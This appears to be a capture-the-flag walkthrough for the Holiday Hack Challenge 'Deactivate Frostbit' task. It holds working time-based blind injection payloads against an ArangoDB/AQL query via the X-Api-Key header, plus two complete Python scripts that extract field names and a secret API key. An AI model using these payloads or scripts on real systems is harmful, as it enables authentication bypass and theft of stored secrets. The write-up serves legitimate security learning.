<div style="text-align: center; font-size: 2em; font-weight: bold; color: black; margin-bottom: 20px;">
    Deactivate Frostbit - Tangle Coalbox
</div>

Dusty Giftwrap had provided us with some hints after completing Snowball Showdown in Act 2:

##Hint 1 - Frostbit Publication

There must be a way to deactivate the ransomware server's data publication. Perhaps one of the other North Pole assets revealed something that could help us find the deactivation path. If so, we might be able to trick the Frostbit infrastructure into revealing more details.

##Hint 2 - Frostbit Slumber

The Frostbit author may have mitigated the use of certain characters, verbs, and simple authentication bypasses, leaving us blind in this case. Therefore, we might need to trick the application into responding differently based on our input and measure its response. If we know the underlying technology used for data storage, we can replicate it locally using Docker containers, allowing us to develop and test techniques and payloads with greater insight into how the application functions.

#Access to the Challenge - Environment set up

If you attempted [Decrypt Frostbit](./Decrypt%20Frostbit.md), then you should have all you need for this challenge already.

If you are attempting deactivate before decrypt, then follow the instructions here to get started: [Environment set up](./Decrypt%20Frostbit.md#access-to-the-challenge-environment-set-up)

#Solution

![Deactivate Frostbit Objective](../../../../images/HHC/2024/Act%203/Deactivate%20Frostbit/Deactivate-0.png)

The data from Santa Vision comes handy again. One of the URLs we learned when completing that challenge was the following API path:

`/api/v1/frostbitadmin/bot/<botuuid>/deactivate`

In particular, this is the entire message payload:

```
"payload": "Error msg: Unauthorized access attempt. /api/v1/frostbitadmin/bot/<botuuid>/deactivate, authHeader: X-API-Key, status: Invalid Key, alert: Warning, recipient: Wombley"
```

The piece of information we were missing from that URL was the `<botuuid>`, however, this is part of the data we obtained from the from memory dump when solving Decrypt Frostbit. It was also present in the debug data for the ransomware page:

```
{"uuid": "917c8ddd-fc69-421e-8134-aa92c78e42f0", "nonce": "REDACTED", "encryptedkey": "REDACTED", "deactivated": false,  "etime": 1766534400}
```
I tested the URL using the aforementioned uuid parameter:
```
GET /api/v1/frostbitadmin/bot/917c8ddd-fc69-421e-8134-aa92c78e42f0/deactivate HTTP/2
```
The server responded with:
```
HTTP/2 403 Forbidden
Server: nginx/1.27.1
Date: Mon, 30 Dec 2024 22:07:36 GMT
Content-Type: application/json
Content-Length: 28
Strict-Transport-Security: max-age=31536000

{"error":"Invalid Request"}
```
This suggests we’re on the right track. The Santa Vision message mentions the authHeader: X-API-Key. Let's now try to send a request adding the X-API-Key header:
```
GET /api/v1/frostbitadmin/bot/917c8ddd-fc69-421e-8134-aa92c78e42f0/deactivate HTTP/2
Host: api.frostbit.app
X-Api-Key: test
```
The server replies with the exact same error... looks like we will not be able to interact with the API unless we can grab a valid X-Api-Key token.

As in the decrypt challenge, we can enable debug mode for the application. We can do it by simply adding ?debug=true to the URL:
```
GET /api/v1/frostbitadmin/bot/917c8ddd-fc69-421e-8134-aa92c78e42f0/deactivate?debug=true HTTP/2
```
The following is the message the server sends back:
```
{"debug":true,"error":"Invalid Key"}
```
One of the hints mentions: The Frostbit author may have mitigated the use of certain characters, verbs, and simple authentication bypasses, leaving us blind in this case.
 
The reference to the word **blind** suggested to me that a blind SQL injection is the likely path to complete this challenge. Right or wrong, the first step would be to find an injection point. There's no many variables on that request that I can control, so I started testing them.

One of the parameters available that we control, is the aforementioned X-API-Key header. I started by sending a '/' character:

`X-Api-Key: /`

This is the response:

`{"debug":true,"error":"Request Blocked"}`

The hint also suggests that some characters and verbs are blocked, so this is looking good. 

Next, I try the classic `'` character:

`X-Api-Key: '`

The error this time is more interested and SQL injection like:
<pre style="white-space: pre-wrap; word-wrap: break-word; background-color: #f5f5f5;">
{"debug":true,"error":"Timeout or error in query:\nFOR doc IN config\n    FILTER doc.<key_name_omitted> == '{user_supplied_x_api_key}'\n    <other_query_lines_omitted>\n    RETURN doc"}
</pre>
Using the error message, I asked chatGPT which database and query language this may be. It suggested ArangoDB with AQL. Arango DB is a NoSQL Database.

I searched for the official documentation, which is located here: https://docs.arangodb.com/stable/aql/fundamentals/syntax/

We know that some verbs are blocked, so to further confirm whether this was indeed ArangoDB, I loaded the entire list of verbs and keywords into Burp intruder:

![Burp Intruder Verb Enumeration](../../../../images/HHC/2024/Act%203/Deactivate%20Frostbit/Deactivate-1.png)


If the response Length was 217 the verb/keyword was allowed, if it was 221 then it was blocked:

Some of the interesting data enumerated includes:

* Characters blocked: /, *
* Characters allowed: | 
* Verbs blocked: WAITFOR, RETURN, INSERT, UPDATE, FOR, FILTER, LET, WITH
* Allowed verbs: SLEEP, UNION, REPLACE, REMOVE, UPSERT, SEARCH, SORT, LIMIT, COLLECT, WINDOW
* Allowed keywords: ALL, ALL_SHORTEST_PATHS, AND, ANY, ASC, DESC, COLLECT, DISTINCT, FALSE, GRAPH, IN, INBOUND, INTO, K_PATHS, K_SHORTEST_PATHS, LIKE, LIMIT, NONE, NOT, NULL, OR, OUTBOUND, REMOVE, REPLACE, SHORTEST_PATH, SORT, TRUE, UPSERT, WINDOW

We know from the database error, that the back end query is as follow:

```
FOR doc IN config 
	FILTER doc.<key_name_omitted> == '{user_supplied_x_api_key}'
	<other_query_lines_omitted>
	RETURN doc"}
```

I then started to try to build very simple queries that worked (basically that did not return a syntax error).

One of such queries I found was: `' OR 1==1 AND 'a'=='a`

This led me to think about the injection we need to deal with. Boolean based would not work, because the application does not return a true/false statement or any other differences in the server replies. If the query is correctly built, we just get the "Invalid Key" error. So the other available option, is time-based. I tested with the following query:

<pre style="white-space: pre-wrap; word-wrap: break-word; background-color: #f5f5f5;">
X-Api-Key: ' OR SLEEP(20) AND 'a'=='a

{"debug":true,"error":"Timeout or error in query:\nFOR doc IN config\n    FILTER doc.<key_name_omitted> == '{user_supplied_x_api_key}'\n    <other_query_lines_omitted>\n    RETURN doc"}
</pre>

The problem with the above query, is that the Database seems to execute the sleep command even with the following values:

`X-Api-Key: ' OR SLEEP(20) AND 'a'=='b`

The key step now is to find a query that can sleep or not sleep the database based on true/false statements. 

After some time, I manage to build this time-based injection query:
```
' OR false ? SLEEP(5) : SLEEP(0) OR '
' OR true ? SLEEP(5) : SLEEP(0) OR '
```
When the value is false the database does not sleep and the query executes without raising errors. With the value set to true, the database sleeps and it shows the time out error we have seen before.

Out first target now, is to figure out the name of the key, basically, `<key_name_omitted>` in the query we see in the error.

ArangoDB document fields can be dynamically named, so we need to:

* Extract the keys (field names) of the document (doc).
* Use timing-based injection to identify each character of the field name.

First, we need to determine how many field names exist in the document. We can do it with this query:

`' OR LENGTH(ATTRIBUTES(doc)) == 1 ? SLEEP(5) : SLEEP(0) OR '`

and keep trying until we get the right number. When I put `== 4` I get this error:
<pre style="white-space: pre-wrap; word-wrap: break-word; background-color: #f5f5f5;">
{"debug":true,"error":"Timeout or error in query:\nFOR doc IN config\n    FILTER doc.<key_name_omitted> == '{user_supplied_x_api_key}'\n    <other_query_lines_omitted>\n    RETURN doc"}
</pre>

Which means that's the correct number of keys.

Now, for each of those keys, we can enumerate the length. Starting from the first one:

`' OR LENGTH(ATTRIBUTES(doc)[0]) == 5 ? SLEEP(5) : SLEEP(0) OR '`

trying until we get the right one. 

`' OR LENGTH(ATTRIBUTES(doc)[0]) == 18 ? SLEEP(5) : SLEEP(0) OR '`

This makes the query sleep, so it has 18 characters. Now, it is time to extract the characters one by one:

`' OR SUBSTRING(ATTRIBUTES(doc)[0], 0, 1) == 'a' ? SLEEP(5) : SLEEP(0) OR '`

`SUBSTRING(ATTRIBUTES(doc)[0], 0, 1)` tests the first character of the field name. 

When I try:

`' OR SUBSTRING(ATTRIBUTES(doc)[0], 0, 1) == 'd' ? SLEEP(5) : SLEEP(0) OR '`

it sleeps, so the first character is d.

To make it more efficient, you can check ranges. For example the following query will check if the letter is between a and m.:

`' OR SUBSTRING(ATTRIBUTES(doc)[0], 0, 1) >= 'a' AND SUBSTRING(ATTRIBUTES(doc)[0], 0, 1) <= 'm' ? SLEEP(5) : SLEEP(0) OR '`

Being a time-based injection, we really don't want to do this manually. So my next step was to build a python script to automate all the process now that I manually verified it works. The following script, will enumerate the number of fields. Then, for each, it will establish the length of the field name. Finally, it will enumerate the field name.

```python
import requests

# Define the target URL and headers
url = "https://api.frostbit.app/api/v1/frostbitadmin/bot/917c8ddd-fc69-421e-8134-aa92c78e42f0/deactivate?debug=true"
headers = {
    "Host": "api.frostbit.app",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
}

def send_injection(payload):
    """
    Sends the HTTP request with the injection payload.
    Automatically handles Content-Length via the requests library.
    """
    headers["X-Api-Key"] = payload
    # Remove Content-Length, let requests handle it
    headers.pop("Content-Length", None)
    response = requests.get(url, headers=headers)
    return response.text, response.status_code

def infer_field_count():
    """
    Determines the number of fields in the document.
    """
    print("[*] Inferring number of fields...")
    count = 0
    while True:
        payload = f"' OR LENGTH(ATTRIBUTES(doc)) == {count} ? SLEEP(5) : SLEEP(0) OR '"
        response_text, _ = send_injection(payload)
        if "Timeout or error in query" in response_text:
            print(f"[+] Number of fields: {count}")
            return count
        count += 1

def infer_character(field_index, char_index, char):
    """
    Test if the character at the given index matches the target by checking the response body.
    """
    payload = f"' OR SUBSTRING(ATTRIBUTES(doc)[{field_index}], {char_index}, 1) == '{char}' ? SLEEP(5) : SLEEP(0) OR '"
    response_text, _ = send_injection(payload)
    return "Timeout or error in query" in response_text  # True if the query succeeded

def infer_field_length(field_index):
    """
    Determines the length of the field name at a given index.
    """
    print(f"[*] Inferring length of field name at index {field_index}...")
    length = 0
    while True:
        payload = f"' OR LENGTH(ATTRIBUTES(doc)[{field_index}]) == {length} ? SLEEP(5) : SLEEP(0) OR '"
        response_text, _ = send_injection(payload)
        if "Timeout or error in query" in response_text:
            print(f"[+] Length of field name at index {field_index}: {length}")
            return length
        length += 1

def infer_field_name(field_index, length):
    """
    Enumerates the characters of the field name at a given index.
    """
    print(f"[*] Inferring field name at index {field_index}...")
    field_name = ""
    for i in range(length):
        for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_":
            if infer_character(field_index, i, char):
                field_name += char
                print(f"[+] Found character {i+1} of field {field_index}: {char}")
                break
    print(f"[+] Field name at index {field_index}: {field_name}")
    return field_name

def main():
    print("[*] Starting field enumeration...")
    field_count = infer_field_count()
    field_names = []
    for field_index in range(field_count):
        field_length = infer_field_length(field_index)
        field_name = infer_field_name(field_index, field_length)
        field_names.append(field_name)
    print("[+] Enumeration complete.")
    print(f"[+] Field Names: {field_names}")

if __name__ == "__main__":
    main()
```

After executing the above script, I get the following output:

```
[+] Number of fields: 4
[+] Field name at index 0: deactivate_api_key
[+] Field name at index 1: _rev
[+] Field name at index 2: _key
[+] Field name at index 3: _id

[+] Field Names: ['deactivate_api_key', '_rev', '_key', '_id']
```
Once I had that information, I build another similar script that focused on extracting the data of `deactivate_api_key`:

```python
import requests

# Define the target URL and headers
url = "https://api.frostbit.app/api/v1/frostbitadmin/bot/917c8ddd-fc69-421e-8134-aa92c78e42f0/deactivate?debug=true"
headers = {
    "Host": "api.frostbit.app",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
}

def send_injection(payload):
    """
    Sends the HTTP request with the injection payload.
    Automatically handles Content-Length via the requests library.
    """
    headers["X-Api-Key"] = payload
    # Remove Content-Length, let requests handle it
    headers.pop("Content-Length", None)
    response = requests.get(url, headers=headers)
    return response.text, response.status_code

def infer_character_value(field_name, char_index, char):
    """
    Test if the character at the given index of the field's value matches the target.
    """
    payload = f"' OR SUBSTRING(doc.{field_name}, {char_index}, 1) == '{char}' ? SLEEP(5) : SLEEP(0) OR '"
    response_text, _ = send_injection(payload)
    return "Timeout or error in query" in response_text  # True if the query succeeded

def infer_value_length(field_name):
    """
    Determines the length of the value stored in the given field.
    """
    print(f"[*] Inferring length of value for field '{field_name}'...")
    length = 0
    while True:
        payload = f"' OR LENGTH(doc.{field_name}) == {length} ? SLEEP(5) : SLEEP(0) OR '"
        response_text, _ = send_injection(payload)
        if "Timeout or error in query" in response_text:
            print(f"[+] Length of value for field '{field_name}': {length}")
            return length
        length += 1

def infer_value(field_name, length):
    """
    Enumerates the characters of the value stored in the given field.
    """
    print(f"[*] Inferring value for field '{field_name}'...")
    value = ""
    for i in range(length):
        for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_":
            if infer_character_value(field_name, i + 1, char):
                value += char
                print(f"[+] Found character {i+1}: {char}")
                break
    print(f"[+] Value for field '{field_name}': {value}")
    return value

def main():
    field_name = "deactivate_api_key"
    print(f"[*] Starting value enumeration for field '{field_name}'...")
    value_length = infer_value_length(field_name)
    value = infer_value(field_name, value_length)
    print("[+] Enumeration complete.")
    print(f"[+] Value for '{field_name}': {value}")

if __name__ == "__main__":
    main()
```

After executing the script, I get the value for X-API-key:

`[+] Value for field 'deactivate_api_key': abe7a6ad-715e-4e6a-901b-c9279a964f91`

I use the value with the deactivate request API, and as expected, that puts an end to Frostbit:

```
GET /api/v1/frostbitadmin/bot/917c8ddd-fc69-421e-8134-aa92c78e42f0/deactivate?debug=true HTTP/2
Host: api.frostbit.app
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Content-Length: 4
X-Api-Key: abe7a6ad-715e-4e6a-901b-c9279a964f91
```

Server reply:

```
HTTP/2 200 OK
Server: nginx/1.27.1
Date: Tue, 31 Dec 2024 23:43:30 GMT
Content-Type: application/json
Content-Length: 314
Strict-Transport-Security: max-age=31536000

{"message":"Response status code: 200, Response body: {\"result\":\"success\",\"rid\":\"917c8ddd-fc69-421e-8134-aa92c78e42f0\",\"hash\":\"6093849c19ae5572d7efc98151579c36bbda0ac6a76bb2adfc55c2406853d2f0\",\"uid\":\"36359\"}\nPOSTED WIN RESULTS FOR RID 917c8ddd-fc69-421e-8134-aa92c78e42f0","status":"Deactivated"}
```

**Another Christmas holiday saved!**
